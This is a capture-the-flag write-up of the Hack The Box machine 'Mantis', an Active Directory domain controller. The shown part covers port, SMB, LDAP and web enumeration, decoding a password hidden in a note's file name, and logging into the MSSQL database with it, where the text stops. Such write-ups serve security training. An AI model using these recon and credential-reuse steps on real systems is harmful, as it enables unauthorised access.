# [mantis](https://app.hackthebox.com/machines/mantis)

> An Active Directory domain controller with a web server containing some developer's notes that disclosed the credential to the domain controller's SQL server. Perusing the tables in the SQL server yielded another credential--this time that of a domain user account. Initial enumeration scans revealed the target's operating system as Windows Server 2008 R2, which is by default vulnerable to MS14-068, allowing any domain user to craft a TGT with a forged PAC that grants them administrative access to the domain. Exploiting this vulnerabiility grants just that.

---

## Open Port Enumeration

### TCP

```bash
$ sudo masscan -p1-65535 10.129.206.19 --rate=1000 -e tun0 --output-format grepable --output-filename enum/mantis.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-16 14:22:10 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/mantis.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
1337,135,139,1433,3268,3269,389,445,464,47001,49152,49153,49154,49155,49157,49158,49164,49165,49167,50255,53,5722,593,636,8080,88,9389,
```

```bash
$ sudo nmap -sC -sV -O -p1337,135,139,1433,3268,3269,389,445,464,47001,49152,49153,49154,49155,49157,49158,49164,49165,49167,50255,53,5722,593,636,8080,88,9389 10.129.206.19 -oA enum/mantis
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-16 09:42 EST
Nmap scan report for 10.129.206.19
Host is up (0.041s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-11-16 14:42:44Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS7
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ssl-date: 2021-11-16T14:43:52+00:00; +8s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-11-16T14:18:20
|_Not valid after:  2051-11-16T14:18:20
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft IIS httpd 7.5
|_http-title: Tossed Salad - Blog
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/7.5
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49164/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
|_ssl-date: 2021-11-16T14:43:52+00:00; +8s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-11-16T14:18:20
|_Not valid after:  2051-11-16T14:18:20
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| ms-sql-info:
|   10.129.206.19:1433:
|     Version:
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2021-11-16T09:43:42-05:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2021-11-16T14:43:46
|_  start_date: 2021-11-16T14:17:53
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
|_clock-skew: mean: 42m59s, deviation: 1h53m23s, median: 7s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.10 seconds
```

The ports 53, 88, and 389 all indicate the target is a Windows Active Directory Domain Controller. The target is also running a web server on ports 1337 and 8080 and a Microsoft SQL server on port 1433. The target's hostname is `mantis.htb.local`. The output from the DNS server indicates that the target's operating system is Windows Server 2008 R2 and thus it is probably vulnerable to MS14-068 if the credentials of a domain user can be obtained.

### UDP

```bash
$ sudo nmap -sU 10.129.206.19
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-16 09:45 EST
Nmap scan report for 10.129.206.19
Host is up (0.15s latency).
Not shown: 955 closed udp ports (port-unreach), 43 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 1412.06 seconds
```

---

## SMB Enumeration

```bash
$ smbmap -H 10.129.206.19 -u "" -p ""
[+] IP: 10.129.206.19:445       Name: 10.129.206.19
```

```bash
$ smbmap -H 10.129.206.19 -u "guest%" -p ""
[!] Authentication error on 10.129.206.19
```

No anonymous or guest access on the target.

---

## LDAP Enumeration

```bash
$ nmap -n -sV --script "ldap* and not brute" 10.129.206.19
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-16 09:53 EST
Nmap scan report for 10.129.206.19
Host is up (0.045s latency).
Not shown: 979 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-11-16 14:54:00Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20211116145453.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
|       dsServiceName: CN=NTDS Settings,CN=MANTIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=htb,DC=local
|       namingContexts: CN=Configuration,DC=htb,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=DomainDnsZones,DC=htb,DC=local
|       namingContexts: DC=ForestDnsZones,DC=htb,DC=local
|       defaultNamingContext: DC=htb,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local
|       configurationNamingContext: CN=Configuration,DC=htb,DC=local
|       rootDomainNamingContext: DC=htb,DC=local
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 127044
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: mantis.htb.local
|       ldapServiceName: htb.local:mantis$@HTB.LOCAL
|       serverName: CN=MANTIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 4
|       forestFunctionality: 4
|_      domainControllerFunctionality: 4
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20211116145453.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
|       dsServiceName: CN=NTDS Settings,CN=MANTIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=htb,DC=local
|       namingContexts: CN=Configuration,DC=htb,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=DomainDnsZones,DC=htb,DC=local
|       namingContexts: DC=ForestDnsZones,DC=htb,DC=local
|       defaultNamingContext: DC=htb,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local
|       configurationNamingContext: CN=Configuration,DC=htb,DC=local
|       rootDomainNamingContext: DC=htb,DC=local
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 127044
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: mantis.htb.local
|       ldapServiceName: htb.local:mantis$@HTB.LOCAL
|       serverName: CN=MANTIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 4
|       forestFunctionality: 4
|_      domainControllerFunctionality: 4
3269/tcp  open  tcpwrapped
8080/tcp  open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: MANTIS; OSs: Windows, Windows 2008 R2; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.27 seconds
```

Nothing new here.

---

## Web Enumeration

### Port 1337

#### Content Discovery

```bash
$ gobuster dir -u http://10.129.206.19:1337 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.206.19:1337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/16 21:26:54 Starting gobuster in directory enumeration mode
===============================================================
/orchard              (Status: 500) [Size: 3026]
/secure_notes         (Status: 301) [Size: 162] [--> http://10.129.206.19:1337/secure_notes/]
                                                                                             
===============================================================
2021/11/16 21:42:13 Finished
===============================================================
```

Both the `/orchard` and `/secure_notes` paths look interesting.

#### Virtual Host Discovery

```bash
$ gobuster vhost -u http://mantis.htb.local:1337 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://mantis.htb.local:1337
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/11/16 10:33:23 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2021/11/16 10:33:46 Finished
===============================================================
```

No virtual hosts.

#### Manual Enumeration

The `/secure_notes` path is a directory listing containing two files: a developer note and some sort of web configuration file.

![](images/Pasted%20image%2020211116223059.png)

The developer note describes the developer's process for installing and configuring [OrchardCMS](https://orchardcore.net/) and SQL Server 2014 Express on the server. The note reveals the SQL username, `admin`, and the database name, `orcharddb`.

```txt
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
```

The note doesn't mention anything about the password, though. Or does it? The name of the file is interesting: `dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt`. Isolating the `NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx` substring and running it through [Cyber Chef's](https://gchq.github.io/CyberChef/) Magic option reveals the string is base64 and hex encoded. After decoding it, the string is `m$$ql_S@_P@ssW0rd!`. Perhaps this is `admin`'s password.

### Port 8080

#### Content Discovery

```bash
$ gobuster dir -u http://10.129.206.19:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-files.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.206.19:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/16 10:06:08 Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 5897]
/.archive             (Status: 200) [Size: 2867]

===============================================================
2021/11/16 10:11:33 Finished
===============================================================
```

`/.archive` is interesting. Check it out.

#### Virtual Host Discovery

```bash
$ gobuster vhost -u http://mantis.htb.local:8080 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://mantis.htb.local:8080
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/11/16 10:33:34 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2021/11/16 10:33:59 Finished
===============================================================
```

No virtual hosts.

#### Manual Enumeration

`/` appears to be the home page of a blog. There are two blog posts, `Pita Pockets with a sun dried tomato flavor` and `Purple cabbage and carrot salad`, which link to `/pita-pockets-with-a-sun-dried-tomato-flavor` and `/Contents/Item/Display/17` respectively.

The link for the second blog post appears to contain a blog identification number: 17. Odds are the backend web application is passing this identification number into a database query.

There is functionality for submitting a comment on the blog post page as well. The form submission appears legitimate, producing the following request.

```http
POST /Comments/Comment/Create?ReturnUrl=http%3A%2F%2F10.129.206.19%3A8080%2FContents%2FItem%2FDisplay%2F17 HTTP/1.1
Host: 10.129.206.19:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 345
Origin: http://10.129.206.19:8080
Connection: close
Referer: http://10.129.206.19:8080/Contents/Item/Display/17
Cookie: __RequestVerificationToken=q3tGOBGjLNJ9T5icPwSaJzfmxjuQpSfrURuZdOzN-Asvjq0iMIT6jeOshfuxyUOlZWpOqn3-ruNYqTN_epQZ1041pq6Z_PYz4in4OYv4fnw1; ASP.NET_SessionId=kkxfv5rm1zaz4s2gp5exjxtv
Upgrade-Insecure-Requests: 1

Comments.Author=tgihf&Comments.Email=tgihf%40mantis.htb.local&Comments.SiteName=http%3A%2F%2F10.10.14.20%2Fblah&Comments.CommentText=blah+woo&Comments.CommentedOn=17&Comments.RepliedOn=&CommonPart.ContainerId=&__RequestVerificationToken=fUdk4g6wTmkXmmUH3-8imITSRdk1s4P6wXv4oHCrfH-VcOHGdNEWaZveWOq0u8_i2g1oeba72XrgWA7xRyQf2loicR9M9ry7b5UBwrOx0e01
```

Interestingly, the refreshed blog doesn't contain the submitted comment. Instead, it reloads the page with the contents of the comment still in the form elements.

Neither the blog post pages nor the comment submission appears to be SQL-injectable.

The `/.archive` path returns a page of month/year combinations of archived blog posts. The only month and year present on the page is 09/2017 (at path `/archive/2017/9`). However, the links on the resultant page are just the same links to the previous blog posts. After some investigation, it doesn't seem as if this page is vulnerable to SQL injection either. Dead end.

---

## MSSQL Access

Use the credential `admin`:`m$$ql_S@_P@ssW0rd!` to access the MSSQL server.

```bash
$ impacket-mssqlclient -db orcharddb htb.local/admin:'m$$ql_S@_P@ssW0rd!'@10.129.206.19
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd

SQL>
```

Retrieve `orcharddb`'s tables.

```sql
SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG                                                                                                                      TABLE_SCHEMA                                                                                                                       TABLE_NAME                                                                                                                         TABLE_TYPE

--------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   ----------

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Blogs_RecentBlogPostsPartRecord                                                                                       b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Blogs_BlogArchivesPartRecord                                                                                          b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Workflows_TransitionRecord                                                                                            b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Workflows_WorkflowRecord                                                                                              b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Workflows_WorkflowDefinitionRecord                                                                                    b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Workflows_AwaitingActivityRecord                                                                                      b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Workflows_ActivityRecord                                                                                              b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Tags_TagsPartRecord                                                                                                   b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Framework_DataMigrationRecord                                                                                         b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Tags_TagRecord                                                                                                        b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Tags_ContentTagRecord                                                                                                 b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Settings_ContentFieldDefinitionRecord                                                                                         b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Framework_DistributedLockRecord                                                                                       b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Settings_ContentPartDefinitionRecord                                                                                          b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Settings_ContentPartFieldDefinitionRecord                                                                                     b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Settings_ContentTypeDefinitionRecord                                                                                          b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Settings_ContentTypePartDefinitionRecord                                                                                      b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Settings_ShellDescriptorRecord                                                                                                b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Settings_ShellFeatureRecord                                                                                                   b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Settings_ShellFeatureStateRecord                                                                                              b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Settings_ShellParameterRecord                                                                                                 b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Settings_ShellStateRecord                                                                                                     b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Framework_ContentItemRecord                                                                                           b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Framework_ContentItemVersionRecord                                                                                    b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Framework_ContentTypeRecord                                                                                           b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Framework_CultureRecord                                                                                               b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Common_BodyPartRecord                                                                                                         b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Common_CommonPartRecord                                                                                                       b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Common_CommonPartVersionRecord                                                                                                b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Common_IdentityPartRecord                                                                                                     b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Containers_ContainerPartRecord                                                                                                b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Containers_ContainerWidgetPartRecord                                                                                          b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Containers_ContainablePartRecord                                                                                              b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Title_TitlePartRecord                                                                                                         b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Navigation_MenuPartRecord                                                                                                     b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Navigation_AdminMenuPartRecord                                                                                                b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Scheduling_ScheduledTaskRecord                                                                                                b'BASE TABLE'

